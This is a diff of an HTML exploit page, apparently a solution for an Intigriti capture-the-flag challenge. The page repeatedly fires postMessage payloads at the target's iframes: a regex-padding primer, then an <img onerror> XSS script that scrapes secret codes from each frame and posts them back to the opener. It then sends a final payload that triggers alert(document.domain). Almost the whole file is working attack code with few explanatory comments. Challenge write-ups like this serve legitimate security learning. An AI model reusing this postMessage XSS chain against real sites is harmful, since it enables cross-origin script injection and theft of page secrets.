@@ -1,96 +1,101 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Intigriti Exploit</title>
+    <title>Intigriti Speed Run</title>
 </head>
 <body>
-    <h1>Challenge Solver (Fixed)</h1>
-    <p>Click the button to start the exploit chain.</p>
-    <button id="btn" style="font-size:20px; padding:15px;">Launch Exploit</button>
+    <h1>Exploit: Speed Run</h1>
+    <p>Click the button. Don't switch tabs!</p>
+    <button id="btn" style="font-size:20px; padding:20px; background:red; color:white;">LAUNCH EXPLOIT</button>
     <h3>Log:</h3>
     <pre id="log" style="background:#f0f0f0; padding:10px;"></pre>
 
     <script>
         let stolenStones = {};
         let targetWin = null;
+        let attackInterval = null;
 
-        // 1. Listen for the stolen pieces coming back from the Stones
+        // 1. Listen for the stolen pieces
         window.addEventListener('message', (event) => {
             if (event.data.type === 'stone_collected') {
-                log(`[SUCCESS] Collected Stone ${event.data.index}: ${event.data.secret}`);
-                stolenStones[event.data.index] = event.data.secret;
-                checkAndSnap();
+                // Avoid duplicates log
+                if (!stolenStones[event.data.index]) {
+                    log(`[+] Captured Stone ${event.data.index}: ${event.data.secret}`);
+                    stolenStones[event.data.index] = event.data.secret;
+                    checkAndSnap();
+                }
             }
         });
 
         document.getElementById('btn').addEventListener('click', () => {
-            // Open the target in a new tab
+            // Open the target
             targetWin = window.open('https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced', 'target');
-            log("Target opened... waiting 4 seconds for load...");
-            
-            // Wait for the target to fully load everything
-            setTimeout(attackAllStones, 4000);
+            log("Target opened! attacking immediately...");
+
+            // START THE ATTACK LOOP
+            // We fire the exploit every 500ms to ensure we hit the window 
+            // between 'page load' and 'bye.jpeg' (0s to 3s).
+            attackInterval = setInterval(attackAllStones, 500);
         });
 
         function attackAllStones() {
-            log("Attacking Stones...");
+            // Stop if window closed or we have all stones (prevent spam)
+            if(Object.keys(stolenStones).length >= 6) return;
+
+            log("Firing exploit salvo...");
+            
+            // Attack all 6 frames
             for (let i = 0; i < 6; i++) {
+                if(stolenStones[i]) continue; // Skip if we already have this one
                 sendExploit(i);
             }
         }
 
         function sendExploit(index) {
-            // Check if window is still open
-            if(!targetWin) { log("Target window lost!"); return; }
-            
-            let targetFrame = targetWin.frames[index];
+            if(!targetWin) return;
+            // Frames might not be ready yet, try-catch to avoid console errors halting script
+            try {
+                let targetFrame = targetWin.frames[index];
+                if (!targetFrame) return;
 
-            // --- STEP 1: THE PRIMER ---
-            // HUGE PADDING FIX: We use 2000 characters to ensure 
-            // the regex 'lastIndex' jumps way past our actual payload length.
-            const padding = "A".repeat(2000); 
-            targetFrame.postMessage(padding + "<", '*');
+                // STEP 1: PRIMER (2000 chars padding)
+                const padding = "A".repeat(2000); 
+                targetFrame.postMessage(padding + "<", '*');
 
-            // --- STEP 2: THE PAYLOAD ---
-            // The script runs inside the iframe.
-            // FIX: We use 'window.top.opener' to talk back to this exploit page.
-            const extractorScript = `
-                var secret = "";
+                // STEP 2: PAYLOAD (Extract from DOM)
+                // Since your screenshot showed the code is visible on screen, 
+                // we use a robust DOM scraper + URL scraper combo.
+                const extractorScript = `
+                    var secret = "";
+                    // 1. Try URL
+                    var match = location.search.match(/=[a-f0-9]{8}/);
+                    if(match) secret = match[0].substring(1);
+                    
+                    // 2. Try Body Text (Reliable for Space Stone & others)
+                    if(!secret || secret.length < 8) {
+                        var body = document.body.innerText;
+                        var hexMatch = body.match(/[a-f0-9]{8}/);
+                        if(hexMatch) secret = hexMatch[0];
+                    }
+
+                    // 3. Send back
+                    if(secret && window.top.opener) {
+                        window.top.opener.postMessage({type: 'stone_collected', index: ${index}, secret: secret}, '*');
+                    }
+                `;
+
+                const payload = `<img src=x onerror="${extractorScript}">`;
+                targetFrame.postMessage(payload, '*');
                 
-                // Strategy A: URL (Works for most stones)
-                var match = location.search.match(/=[a-f0-9]{8}/);
-                if(match) secret = match[0].substring(1);
-                
-                // Strategy B: DOM Scan (Needed for Space Stone which has no URL param)
-                if(!secret) {
-                    // Look for any 8-char hex string in the body
-                    var bodyText = document.body.innerText || "";
-                    var hexMatch = bodyText.match(/[a-f0-9]{8}/);
-                    if(hexMatch) secret = hexMatch[0];
-                }
-
-                // Send back to the Exploit Page (window.top.opener)
-                if(window.top && window.top.opener) {
-                    window.top.opener.postMessage({type: 'stone_collected', index: ${index}, secret: secret}, '*');
-                }
-            `;
-
-            // Wrap in image tag
-            const payload = `<img src=x onerror="${extractorScript}">`;
-            
-            // Send payload immediately
-            targetFrame.postMessage(payload, '*');
+            } catch(e) { console.log("Frame not ready yet"); }
         }
 
         function checkAndSnap() {
-            // Do we have all 6 pieces? (Indices 0-5)
-            // We check the length of keys in our object
+            // Do we have all 6?
             if (Object.keys(stolenStones).length >= 6) {
+                clearInterval(attackInterval); // Stop the attack loop
                 
-                // Reassemble Code based on correct order
-                // DOM Order: 0:Power, 1:Reality, 2:Soul, 3:Space, 4:Time, 5:Mind
-                // Code Order: Power(0) + Mind(5) + Reality(1) + Space(3) + Soul(2) + Time(4)
-                
+                // Reassemble: Power(0) + Mind(5) + Reality(1) + Space(3) + Soul(2) + Time(4)
                 const fullCode = 
                     stolenStones[0] + 
                     stolenStones[5] + 
@@ -99,24 +104,26 @@
                     stolenStones[2] + 
                     stolenStones[4];
 
-                log("FULL CODE ASSEMBLED: " + fullCode);
+                log("GAUNTLET COMPLETE: " + fullCode);
+                log("Executing SNAP...");
 
-                // --- FINAL ATTACK ---
-                // Send the command to the Main Page using one of the stones (Soul/Index 2)
-                const killPayload = `<img src=x onerror="parent.postMessage('${fullCode}' + 'alert(document.domain)', '*')">`;
+                // FINAL ATTACK
+                // We send the message to the MAIN window (targetWin).
+                // Even if the iframes are dead (bye.jpeg), the main window listener 
+                // is usually still attached to the window object!
                 
-                // Reprime and Fire
-                const padding = "A".repeat(2000);
-                targetWin.frames[2].postMessage(padding + "<", '*');
-                targetWin.frames[2].postMessage(killPayload, '*');
+                // Send directly to the window (no need to use an iframe proxy if we are just talking to the window)
+                // The challenge listener is: window.addEventListener('message', ...)
                 
-                log("Final payload sent! Check the other tab for the alert.");
+                const finalPayload = fullCode + "alert(document.domain)";
+                targetWin.postMessage(finalPayload, '*');
+                
+                log("Final payload sent! Check the target tab.");
             }
         }
 
         function log(msg) {
-            document.getElementById('log').innerText += msg + "\n";
-            console.log(msg);
+            document.getElementById('log').innerText = msg + "\n" + document.getElementById('log').innerText;
         }
     </script>
 </body>
